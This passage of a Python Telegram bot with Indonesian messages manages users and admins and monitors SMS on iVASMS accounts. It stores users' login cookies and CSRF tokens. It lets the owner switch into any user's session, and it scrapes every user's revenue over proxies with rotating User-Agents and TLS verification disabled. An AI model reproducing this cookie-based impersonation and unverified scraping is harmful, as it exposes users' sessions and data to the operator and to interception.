                f"{em(E1, '⭐')} <b>USER BERHASIL DITAMBAHKAN</b>\n\n"
                f"User ID: {target_user_id}{username_display}\n"
                f"Ditambahkan oleh: {user_id}\n\n"
                f"User sekarang bisa menggunakan bot ini.",
                parse_mode=ParseMode.HTML
            )
            
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text="🎉 <b>SELAMAT!</b>\n\nAnda telah diizinkan menggunakan bot ini oleh owner.\n\nGunakan /start untuk memulai.",
                    parse_mode=ParseMode.HTML
                )
                print(f"[DEBUG] Notifikasi terkirim ke {target_user_id}")
            except Exception as e:
                print(f"[DEBUG] Gagal kirim notifikasi: {e}")
                
                await update.message.reply_text(
                    f"{em(E2, '⭐')} <b>CATATAN</b>\n\n"
                    f"User berhasil ditambahkan, tetapi bot tidak bisa mengirim notifikasi.\n"
                    f"Pastikan user sudah pernah mengirim pesan ke bot ini.",
                    parse_mode=ParseMode.HTML
                )
            
        except Exception as e:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>GAGAL MENAMBAH USER</b>\n\nError: {str(e)}",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        await update.message.reply_text(
            f"{em(E2, '⭐')} <b>ERROR</b>\n\n{str(e)}",
            parse_mode=ParseMode.HTML
        )
async def _adduser_command_v2_obsolete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /adduser - Menambah user yang diizinkan (hanya owner)"""
    user_id = update.effective_user.id
    
    
    if not is_owner(user_id):
        return
    
    if not context.args:
        await update.message.reply_text(
            "📝 <b>CARA MENAMBAH USER</b>\n\n"
            "Gunakan format:\n"
            "• /adduser [user_id]\n"
            "• /adduser @username\n\n"
            "Contoh:\n"
            "• /adduser 123456789\n"
            "• /adduser @username\n\n"
            f"{em(E2, '⭐')} <b>Catatan:</b>\n"
            "Jika menggunakan username, pastikan user sudah pernah mengirim pesan /start ke bot ini.\n\n"
            "Untuk melihat daftar user:\n/listuser\n\n"
            "Untuk menghapus user:\n/deluser [user_id]",
            parse_mode=ParseMode.HTML
        )
        return
    
    target = context.args[0].strip()
    target_user_id = None
    target_username = None
    
    try:
        
        if target.startswith('@'):
            username = target[1:]  
            target_username = username
            
            
            
            cur.execute("SELECT user_id FROM user_sessions WHERE email LIKE ?", (f"%{username}%",))
            result = cur.fetchone()
            if result:
                target_user_id = result[0]
                print(f"[DEBUG] Found user via database: {target_user_id}")
                await update.message.reply_text(
                    f" INFO\n\n"
                    f"User ditemukan dari database iVASMS.\n"
                    f"User ID: {target_user_id}\n\n"
                    f"Menambahkan...",
                    parse_mode=ParseMode.HTML
                )
            else:
                
                try:
                    chat = await context.bot.get_chat(target)
                    target_user_id = chat.id
                    target_username = chat.username or username
                    print(f"[DEBUG] Found user via get_chat: {target_user_id}")
                except Exception as e:
                    print(f"[DEBUG] Gagal get_chat: {e}")
                    
                    await update.message.reply_text(
                        f"{em(E2, '⭐')} <b>GAGAL MENAMBAH USER</b>\n\n"
                        f"Username {target} tidak ditemukan.\n\n"
                        f"📌 <b>Penyebab:</b>\n"
                        f"User belum pernah berinteraksi dengan bot ini.\n\n"
                        f"💡 <b>Solusi:</b>\n\n"
                        f"<b>Opsi 1:</b> Minta user untuk mengirim pesan /start ke bot ini terlebih dahulu.\n\n"
                        f"<b>Opsi 2:</b> Gunakan user ID langsung (lebih disarankan):\n"
                        f"• Minta user forward pesan ke @userinfobot\n"
                        f"• Dapatkan user ID-nya\n"
                        f"• Gunakan: /adduser [user_id]\n\n"
                        f"<b>Opsi 3:</b> Jika user pernah login ke iVASMS, bisa cek di database:\n"
                        f"• Periksa email yang digunakan\n"
                        f"• Gunakan user ID yang terdaftar di database",
                        parse_mode=ParseMode.HTML
                    )
                    return
        
        
        else:
            try:
                target_user_id = int(target)
            except ValueError:
                await update.message.reply_text(
                    f"{em(E2, '⭐')} <b>FORMAT SALAH</b>\n\n"
                    "Format harus berupa:\n"
                    "• User ID (angka): /adduser 123456789\n"
                    "• Username: /adduser @username\n\n"
                    " Username hanya bisa digunakan jika user sudah pernah chat dengan bot.",
                    parse_mode=ParseMode.HTML
                )
                return
        
        
        if not target_user_id:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>GAGAL</b>\n\nTidak dapat menentukan user ID.",
                parse_mode=ParseMode.HTML
            )
            return
        
        
        if target_user_id == USER_ID:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>TIDAK BISA MENAMBAH OWNER</b>\n\nOwner sudah otomatis terdaftar.",
                parse_mode=ParseMode.HTML
            )
            return
        
        
        cur.execute("SELECT user_id, username FROM allowed_users WHERE user_id = ?", (target_user_id,))
        existing = cur.fetchone()
        if existing:
            existing_username = f" (@{existing[1]})" if existing[1] else ""
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>USER SUDAH ADA</b>\n\n"
                f"User ID: {target_user_id}{existing_username}\n"
                f"Sudah terdaftar sebelumnya.",
                parse_mode=ParseMode.HTML
            )
            return
        
        
        try:
            cur.execute(
                "INSERT INTO allowed_users (user_id, username, added_by) VALUES (?, ?, ?)",
                (target_user_id, target_username, user_id)
            )
            conn.commit()
            
            
            username_display = f" (@{target_username})" if target_username else ""
            await update.message.reply_text(
                f"{em(E1, '⭐')} <b>USER BERHASIL DITAMBAHKAN</b>\n\n"
                f"User ID: {target_user_id}{username_display}\n"
                f"Ditambahkan oleh: {user_id}\n\n"
                f"User sekarang bisa menggunakan bot ini.",
                parse_mode=ParseMode.HTML
            )
            
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text="🎉 <b>SELAMAT!</b>\n\nAnda telah diizinkan menggunakan bot ini oleh owner.\n\nGunakan /start untuk memulai.",
                    parse_mode=ParseMode.HTML
                )
                print(f"[DEBUG] Notifikasi terkirim ke {target_user_id}")
            except Exception as e:
                print(f"[DEBUG] Gagal kirim notifikasi: {e}")
                
                await update.message.reply_text(
                    f"{em(E2, '⭐')} <b>CATATAN</b>\n\n"
                    f"User berhasil ditambahkan, tetapi bot tidak bisa mengirim notifikasi.\n"
                    f"Kemungkinan user belum pernah mengirim pesan ke bot.\n\n"
                    f"User tetap bisa menggunakan bot setelah mengirim /start.",
                    parse_mode=ParseMode.HTML
                )
            
        except Exception as e:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>GAGAL MENAMBAH USER</b>\n\nError: {str(e)}",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        await update.message.reply_text(
            f"{em(E2, '⭐')} <b>ERROR</b>\n\n{str(e)}",
            parse_mode=ParseMode.HTML
        )

async def listuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /listuser - Melihat daftar user yang diizinkan (hanya owner)"""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
    await owner_list_users_callback(update, context)

async def deluser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /deluser - Menghapus user yang diizinkan (hanya owner)"""
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        return
    
    if not context.args:
        await update.message.reply_text(
            "📝 <b>CARA MENGHAPUS USER</b>\n\n"
            "Gunakan format: /deluser [user_id]\n\n"
            "Contoh: /deluser 123456789",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text(
            f"{em(E2, '⭐')} <b>FORMAT SALAH</b>\n\nFormat harus berupa angka (user_id).\nContoh: /deluser 123456789",
            parse_mode=ParseMode.HTML
        )
        return
    
    if target_user_id == USER_ID:
        await update.message.reply_text(
            f"{em(E2, '⭐')} <b>TIDAK BISA MENGHAPUS OWNER</b>\n\nOwner tidak bisa dihapus dari daftar.",
            parse_mode=ParseMode.HTML
        )
        return
    
    cur.execute("SELECT user_id FROM allowed_users WHERE user_id = ?", (target_user_id,))
    user = cur.fetchone()
    
    if not user:
        await update.message.reply_text(
            f"{em(E2, '⭐')} <b>USER TIDAK DITEMUKAN</b>\n\nUser ID {target_user_id} tidak ada dalam daftar.",
            parse_mode=ParseMode.HTML
        )
        return
    
    cur.execute("DELETE FROM allowed_users WHERE user_id = ?", (target_user_id,))
    conn.commit()
    
    await update.message.reply_text(
        f"{em(E1, '⭐')} <b>USER BERHASIL DIHAPUS</b>\n\n"
        f"User ID: {target_user_id}\n\n"
        f"User tidak lagi dapat menggunakan bot ini.",
        parse_mode=ParseMode.HTML
    )

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /logout - Logout dari akun"""

    user_id = update.effective_user.id
    
    
    if not check_user_login(user_id):
        await update.message.reply_text(
            " Kamu belum login!",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
        return
    
    
    email, _, _, _, _, _, _ = get_user_session(user_id)
    
    text = f""" KONFIRMASI LOGOUT 

{EMOJI['LINE']}
{EMOJI['USER']} User ID: {user_id}
{EMOJI['MAIL']} Email: {email}

{em(E2, '⭐')} <b>PERINGATAN!</b>
Session akan dihapus dari database.
Anda perlu login ulang dengan /cookies
{EMOJI['LINE']}

Yakin ingin logout?"""
    
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        reply_markup=get_logout_keyboard(user_id)
    )

def fetch_user_sms_stats(user_id, email, cookies_dict, csrf):
    try:
        session = requests.Session()
        apply_proxy_to_session(session)
        session.cookies.update(cookies_dict)
        session.headers.update({
            'User-Agent': get_random_user_agent(),
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'text/html, */*; q=0.01',
            'Referer': f"{BASE_URL}/portal/sms/received"
        })
        
        today = datetime.now().strftime("%Y-%m-%d")
        files = {
            'from': (None, today),
            'to': (None, today),
            '_token': (None, csrf)
        }
        url = f"{BASE_URL}/portal/sms/received/getsms"
        r = session.post(url, files=files, timeout=10, verify=False)
        if r.status_code != 200:
            return None, f"HTTP {r.status_code}"
        
        html_content = r.text
        # Parse the counters
        count_match = re.search(r'\$\("#CountSMS"\)\.html\("([^"]+)"\)', html_content)
        paid_match = re.search(r'\$\("#PaidSMS"\)\.html\("([^"]+)"\)', html_content)
        unpaid_match = re.search(r'\$\("#UnpaidSMS"\)\.html\("([^"]+)"\)', html_content)
        rev_match = re.search(r'\$\("#RevenueSMS"\)\.html\("([^"]+)"\)', html_content)
        
        if not count_match and not paid_match and not unpaid_match and not rev_match:
            if "login" in html_content.lower() or "csrf" in html_content.lower():
                return None, "Session/Cookie Expired (Silakan Login Ulang)"
            return None, "Gagal memuat data (Session Expired/CSRF Invalid)"
            
        count = count_match.group(1) if count_match else "0"
        paid = paid_match.group(1) if paid_match else "0"
        unpaid = unpaid_match.group(1) if unpaid_match else "0"
        revenue = rev_match.group(1) if rev_match else "$0.00"
        
        return {
            'count': count,
            'paid': paid,
            'unpaid': unpaid,
            'revenue': revenue
        }, None
    except Exception as e:
        return None, str(e)


async def switch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != USER_ID:
        return
    
    args = context.args
    if args:
        target_input = args[0]
        email_input = args[1] if len(args) > 1 else None
        
        try:
            if target_input.isdigit():
                target_user_id = int(target_input)
                if email_input:
                    cur.execute("SELECT email FROM user_sessions WHERE user_id = ? AND email = ?", (target_user_id, email_input))
                else:
                    cur.execute("SELECT email FROM user_sessions WHERE user_id = ?", (target_user_id,))
                
                rows = cur.fetchall()
                if not rows:
                    await update.message.reply_text("❌ Akun user tidak ditemukan di database.")
                    return
                elif len(rows) > 1 and not email_input:
                    text = "⚠️ User memiliki beberapa akun email. Silakan pilih salah satu:\n\n"
                    keyboard = []
                    for row in rows:
                        email = row[0]
                        keyboard.append([InlineKeyboardButton(f"{email}", callback_data=f"switch_to_{target_user_id}_{email}", style="primary")])
                    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
                    return
                else:
                    target_email = rows[0][0]
            else:
                cur.execute("SELECT user_id, email FROM user_sessions WHERE email = ?", (target_input,))
                row = cur.fetchone()
                if not row:
                    await update.message.reply_text("❌ Email tidak ditemukan di database.")
                    return
                target_user_id, target_email = row
            
            cur.execute("""
                INSERT INTO owner_switch (owner_id, target_user_id, target_email)
                VALUES (?, ?, ?)
                ON CONFLICT(owner_id) DO UPDATE SET
                    target_user_id = excluded.target_user_id,
                    target_email = excluded.target_email
            """, (USER_ID, target_user_id, target_email))
            conn.commit()
            
            await update.message.reply_text(
                f"✅ <b>Berhasil Switch Akun!</b>\n\n"
                f"👤 <b>Target User ID:</b> <code>{target_user_id}</code>\n"
                f"✉️ <b>Target Email:</b> <code>{target_email}</code>\n\n"
                f"Sekarang bot akan berjalan menggunakan sesi target. Gunakan /unswitch untuk kembali.",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
        return

    cur.execute("SELECT user_id, email, is_active FROM user_sessions")
    rows = cur.fetchall()
    if not rows:
        text = "❌ Tidak ada sesi user tersimpan di database."
        keyboard = [[InlineKeyboardButton("KEMBALI", callback_data="owner_menu", icon_custom_emoji_id="5449847653586188540", style="danger")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup)
        return
    
    text = "🔄 <b>Switch Akun (Owner Only)</b>\n\nSilakan pilih akun user yang ingin Anda masuki:\n\n"
    keyboard = []
    for r_user_id, r_email, is_active in rows:
        active_status = "🟢" if is_active else "⚪️"
        keyboard.append([InlineKeyboardButton(f"{active_status} ID: {r_user_id} - {r_email}", callback_data=f"switch_to_{r_user_id}_{r_email}", style="primary")])
    
    cur.execute("SELECT target_user_id, target_email FROM owner_switch WHERE owner_id = ?", (USER_ID,))
    switched = cur.fetchone()
    if switched:
        text += f"⚠️ <b>Status saat ini:</b> Switched ke ID <code>{switched[0]}</code> ({switched[1]})\n\n"
        keyboard.append([InlineKeyboardButton("Kembalikan ke Sesi Owner (Unswitch)", callback_data="unswitch_acc", icon_custom_emoji_id="5449847653586188540", style="danger")])
    
    keyboard.append([InlineKeyboardButton("KEMBALI KE MENU OWNER", callback_data="owner_menu", icon_custom_emoji_id="5449847653586188540", style="danger")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)


async def unswitch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != USER_ID:
        return
    
    try:
        cur.execute("DELETE FROM owner_switch WHERE owner_id = ?", (USER_ID,))
        conn.commit()
        
        text = "✅ <b>Sesi Owner telah dikembalikan!</b>\n\nAnda kembali menggunakan akun asli Anda."
        keyboard = [[InlineKeyboardButton("KEMBALI KE MENU OWNER", callback_data="owner_menu", icon_custom_emoji_id="5449847653586188540", style="danger")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    except Exception as e:
        text = f"❌ Error: {e}"
        keyboard = [[InlineKeyboardButton("KEMBALI KE MENU OWNER", callback_data="owner_menu", icon_custom_emoji_id="5449847653586188540", style="danger")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup)


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != USER_ID:
        return
        
    query = update.callback_query
    if query:
        status_msg = await query.message.reply_text(f"{em(CE_LOADING,'🟠')} <b>Mengambil statistik semua user...</b>", parse_mode=ParseMode.HTML)
        try:
            await query.answer()
        except:
            pass
    else:
        status_msg = await update.message.reply_text(f"{em(CE_LOADING,'🟠')} <b>Mengambil statistik semua user...</b>", parse_mode=ParseMode.HTML)
    
    try:
        cur.execute("SELECT user_id, username FROM allowed_users")
        user_map = {row[0]: row[1] for row in cur.fetchall()}
        
        cur.execute("SELECT user_id, email, session_data, is_active FROM user_sessions")
        sessions = cur.fetchall()
        
        keyboard = [[InlineKeyboardButton("KEMBALI KE MENU OWNER", callback_data="owner_menu", icon_custom_emoji_id="5449847653586188540", style="danger")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if not sessions:
            if query:
                await status_msg.edit_text("❌ Tidak ada sesi user tersimpan di database.", reply_markup=reply_markup)
            else:
                await status_msg.edit_text("❌ Tidak ada sesi user tersimpan di database.")
            return
        
        report_lines = []
        report_lines.append("📊 <b>STATISTIK USER LIVE (IVASMS)</b>")
        report_lines.append(f"📅 Tanggal: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n")
        
        for r_user_id, r_email, session_data_json, is_active in sessions:
            username = user_map.get(r_user_id) or "Unknown"
            active_marker = "🟢" if is_active else "⚪️"
            
            if not session_data_json:
                report_lines.append(
                    f"👤 <b>User:</b> @{username} (<code>{r_user_id}</code>)\n"
                    f"✉️ <b>Email:</b> <code>{r_email}</code> {active_marker}\n"
                    f"❌ <i>Sesi kosong / tidak valid</i>\n"
                    f"------------------------------"
                )
                continue
            
            data = json.loads(session_data_json)
            cookies = data.get('cookies', {})
            csrf = data.get('csrf')
            
            stats, err = fetch_user_sms_stats(r_user_id, r_email, cookies, csrf)
            if err:
                report_lines.append(
                    f"👤 <b>User:</b> @{username} (<code>{r_user_id}</code>)\n"
                    f"✉️ <b>Email:</b> <code>{r_email}</code> {active_marker}\n"
                    f"⚠️ <i>Gagal fetch stats: {err}</i>\n"
                    f"------------------------------"
                )
            else:
                report_lines.append(
                    f"{em(CE_PROFILE,'👤')} <b>User Telegram:</b> @{username}\n"
                    f"{em(CE_PROFILE,'👤')} <b>ID Telegram:</b> <code>{r_user_id}</code>\n"
                    f"{em(CE_EMAIL,'📩')} <b>Email:</b> <code>{r_email}</code> {active_marker}\n"
                    f"{em(E1,'⭐')} <b>Jumlah SMS:</b> <code>{stats['count']}</code>\n"
                    f"{em(E1,'⭐')} <b>SMS Berbayar:</b> <code>{stats['paid']}</code>\n"
                    f"{em(CE_LOADING,'🟠')} <b>SMS Belum Bayar:</b> <code>{stats['unpaid']}</code>\n"
                    f"{em(E1,'⭐')} <b>Pendapatan:</b> <code>{stats['revenue']}</code>\n"
                    f"------------------------------"
                )
        
        full_report = "\n".join(report_lines)
        if len(full_report) > 4000:
            parts = [full_report[i:i+4000] for i in range(0, len(full_report), 4000)]
            try:
                await status_msg.delete()
            except:
                pass
            for idx, part in enumerate(parts):
                markup = reply_markup if idx == len(parts) - 1 else None
                await context.bot.send_message(chat_id=user_id, text=part, parse_mode=ParseMode.HTML, reply_markup=markup)
        else:
            await status_msg.edit_text(full_report, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            
    except Exception as e:
        if query:
            await status_msg.edit_text(f"❌ Terjadi kesalahan saat memuat stats: {e}", reply_markup=reply_markup)
        else:
            await status_msg.edit_text(f"❌ Terjadi kesalahan saat memuat stats: {e}")


async def notif_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /notif - Aktifkan Live SMS Monitor"""
    user_id = update.effective_user.id
    if not is_allowed_user(user_id):
        return
        
    if not check_user_login(user_id):
        await update.message.reply_text(
            f"{em(E5,'🏴\u200d☠️')} Kamu belum login! Gunakan /cookies dulu.",
            parse_mode=ParseMode.HTML
        )
        return
        
    if user_id in active_notif_monitor:
        elapsed = ''
        if user_id in notif_start_time:
            delta = datetime.now() - notif_start_time[user_id]
            mins = int(delta.total_seconds() // 60)
            elapsed = f"\n{em(CE_WAKTU,'⏲')} <b>Uptime</b>: <code>{mins} menit</code>"
        text = (
            f"{_header('LIVE MONITOR')}"
            f"\n\n{em(E6,'⭐')} Monitor sudah <b>AKTIF</b> untuk akun kamu!"
            f"{elapsed}"
            f"\n\n{em(E2,'⭐')} Bot akan mengirim pesan setiap ada SMS baru masuk."
            f"\n\n{_footer()}"
        )
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton("STOP MONITOR", callback_data=f"notif_stop_{user_id}", icon_custom_emoji_id="5870778972857438051", style="danger")
        ]])
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
        return
    
    # Ambil info email untuk display
    email_info, _, _, _, _, _, _ = get_user_session(user_id)
    email_display = f"<code>{email_info}</code>" if email_info else "<i>Unknown</i>"
    
    active_notif_monitor.add(user_id)
    notif_start_time[user_id] = datetime.now()
    notif_sms_count[user_id] = 0
    # Bersihkan history seen SMS saat mulai baru
    notif_seen_sms[user_id] = set()
    
    text = (
        f"{_header('LIVE MONITOR ACTIVATED')}\n\n"
        f"{em(CE_EMAIL,'📩')} <b>Akun</b>: {email_display}\n"
        f"{em(CE_WAKTU,'⏲')} <b>Interval</b>: <code>15 detik</code>\n"
        f"{em(E6,'⭐')} <b>Status</b>: 🟢 <code>RUNNING</code>\n\n"
        f"{em(E2,'⭐')} Bot akan mengirim notifikasi setiap ada\n"
        f"    SMS baru masuk ke akun iVASMS kamu.\n"
        f"{em(E3,'⭐')} Siklus pertama hanya mencatat SMS yang sudah ada\n"
        f"    (tidak di-spam). SMS baru setelah itu langsung dikirim.\n"
        f"{em(E3,'⭐')} Pesan notifikasi otomatis terhapus setelah 10 menit.\n\n"
        f"{_footer()}"
    )
    
    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("STOP MONITOR", callback_data=f"notif_stop_{user_id}", icon_custom_emoji_id="5870778972857438051", style="danger")
    ]])
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

async def stop_notif_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /stopnotif - Matikan Live SMS Monitor"""
    user_id = update.effective_user.id
    
    if user_id in active_notif_monitor:
        active_notif_monitor.remove(user_id)
        
        # Hitung durasi
        duration_text = ""
        if user_id in notif_start_time:
            delta = datetime.now() - notif_start_time.pop(user_id)
            mins = int(delta.total_seconds() // 60)
            secs = int(delta.total_seconds() % 60)
            duration_text = f"\n{em(CE_WAKTU,'⏲')} <b>Durasi</b>: <code>{mins}m {secs}s</code>"
        
        sms_detected = notif_sms_count.pop(user_id, 0)
        notif_seen_sms.pop(user_id, None)
        
        text = (
            f"{_header('MONITOR STOPPED')}\n\n"
            f"{em(E6,'⭐')} <b>Status</b>: 🔴 <code>STOPPED</code>"
            f"{duration_text}\n"
            f"{em(CE_EMAIL,'📩')} <b>SMS Terdeteksi</b>: <code>{sms_detected}</code>\n\n"
            f"{em(E2,'⭐')} Gunakan /notif untuk mengaktifkan kembali.\n\n"
            f"{_footer()}"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    else:
        text = (
            f"{_header('MONITOR STATUS')}\n\n"
            f"{em(E2,'⭐')} Monitor memang tidak aktif.\n"
            f"{em(E3,'⭐')} Gunakan /notif untuk mengaktifkan.\n\n"
            f"{_footer()}"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def notifstatus_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /notifstatus - Lihat status live monitor (owner only)"""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
    
    if not active_notif_monitor:
        text = (
            f"{_header('MONITOR STATUS')}\n\n"
            f"{em(E2,'⭐')} Tidak ada user yang sedang monitoring.\n\n"
            f"{_footer()}"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
        return
    
    lines = []
    for uid in list(active_notif_monitor):
        uptime_str = "?"
        if uid in notif_start_time:
            delta = datetime.now() - notif_start_time[uid]
            mins = int(delta.total_seconds() // 60)
            uptime_str = f"{mins}m"
        
        last_check_str = "Never"
        if uid in notif_last_check:
            last_check_str = notif_last_check[uid].strftime('%H:%M:%S')
        
        sms_count = notif_sms_count.get(uid, 0)
        seen_count = len(notif_seen_sms.get(uid, set()))
        
        lines.append(
            f"  {em(CE_PROFILE,'👤')} <code>{uid}</code>\n"
            f"      ├ {em(CE_WAKTU,'⏲')} Uptime: <code>{uptime_str}</code>\n"
            f"      ├ {em(CE_EMAIL,'📩')} SMS Sent: <code>{sms_count}</code>\n"
            f"      ├ {em(E2,'⭐')} Seen: <code>{seen_count}</code>\n"
            f"      └ {em(E3,'⭐')} Last Check: <code>{last_check_str}</code>"
        )
    
    text = (
        f"{_header('MONITOR STATUS')}\n\n"
        f"{em(E6,'⭐')} <b>Active Monitors</b>: <code>{len(active_notif_monitor)}</code>\n\n"
        + "\n\n".join(lines) +
        f"\n\n{_footer()}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /addadmin - Tambah Admin (owner only) — support User ID atau @username"""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{em(CE_ADD, '➕')} <b>TAMBAH ADMIN</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Gunakan: <code>/addadmin [user_id atau @username]</code>\n\n"
            f"Contoh:\n"
            f"• <code>/addadmin 123456789</code>\n"
            f"• <code>/addadmin @maklohytam</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML
        )
        return
    
    target_input = context.args[0].strip()
    target_id = None
    target_username = None
    
    if target_input.startswith('@'):
        target_id, target_username, err = await resolve_username_to_id_async(target_input, context)
        if not target_id:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>GAGAL</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n{err}\n\n━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML
            )
            return
    else:
        try:
            target_id = int(target_input)
        except ValueError:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>FORMAT SALAH</b>\n\n"
                f"Gunakan User ID (angka) atau @username.\n"
                f"Contoh: <code>/addadmin 123456789</code> atau <code>/addadmin @username</code>",
                parse_mode=ParseMode.HTML
            )
            return
    
    try:
        cur.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (target_id,))
        conn.commit()
        uname_display = target_username or f"Admin_{target_id}"
        cur.execute("INSERT OR IGNORE INTO allowed_users (user_id, username, added_by) VALUES (?, ?, ?)", (target_id, uname_display, user_id))
        conn.commit()
        uname_text = f" (@{target_username})" if target_username else ""
        await update.message.reply_text(
            f"{em(E1, '⭐')} <b>ADMIN BERHASIL DITAMBAHKAN</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{em(CE_PROFILE, '👤')} User ID: <code>{target_id}</code>{uname_text}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Gagal menambah admin: {e}")

async def deladmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /deladmin - Hapus Admin (owner only) — support User ID atau @username"""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{em(CE_HAPUS, '🗑')} <b>HAPUS ADMIN</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Gunakan: <code>/deladmin [user_id atau @username]</code>\n\n"
            f"Contoh:\n"
            f"• <code>/deladmin 123456789</code>\n"
            f"• <code>/deladmin @username</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML
        )
        return
    
    target_input = context.args[0].strip()
    target_id = None
    
    if target_input.startswith('@'):
        target_id, _, err = await resolve_username_to_id_async(target_input, context)
        if not target_id:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>GAGAL</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n{err}\n\n━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML
            )
            return
    else:
        try:
            target_id = int(target_input)
        except ValueError:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>FORMAT SALAH</b>\n\nGunakan User ID (angka) atau @username.",
                parse_mode=ParseMode.HTML
            )
            return
        
    try:
        cur.execute("DELETE FROM admins WHERE user_id = ?", (target_id,))
        conn.commit()
        await update.message.reply_text(
            f"{em(E1, '⭐')} <b>ADMIN BERHASIL DIHAPUS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{em(CE_PROFILE, '👤')} User ID: <code>{target_id}</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Gagal menghapus admin: {e}")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /ban - Blokir User (owner/admin only) — support User ID atau @username"""
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        return
        
    if not context.args:
        await update.message.reply_text(
            f"{em(E2, '⛔')} <b>BAN USER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Gunakan: <code>/ban [user_id atau @username]</code>\n\n"
            f"Contoh:\n"
            f"• <code>/ban 123456789</code>\n"
            f"• <code>/ban @username</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML
        )
        return
    
    target_input = context.args[0].strip()
    target_id = None
    target_username = None
    
    if target_input.startswith('@'):
        username = target_input[1:]
        target_username = username
        # Try get_chat first
        try:
            chat = await context.bot.get_chat(target_input)
            if chat:
                target_id = chat.id
                target_username = chat.username or username
        except Exception as e:
            print(f"[BAN] get_chat({target_input}) fail: {e}")
        
